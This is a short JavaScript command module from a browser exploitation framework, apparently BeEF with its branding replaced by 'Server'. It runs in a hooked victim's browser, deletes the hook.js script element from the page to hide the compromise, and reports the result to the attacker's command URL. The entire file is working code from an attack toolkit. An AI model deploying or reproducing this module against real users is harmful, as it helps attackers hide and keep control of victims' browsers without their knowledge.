//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	/**
	 * Removes the Server hook.js
	 * @return: true if the hook.js script is removed from the DOM
	 */
	var removeHookElem = function() {
		var removedFrames = $j('script[src*="'+server.net.hook+'"]').remove();
		if (removedFrames.length > 0) {
			return true;
		} else {
			return false;
		}
	}

	if (removeHookElem() == true) {
		server.net.send("<%= @command_url %>", <%= @command_id %>, "result=successfully removed the hook script element");
	} else {
		server.net.send("<%= @command_url %>", <%= @command_id %>, "result=something did not work");
	}

});

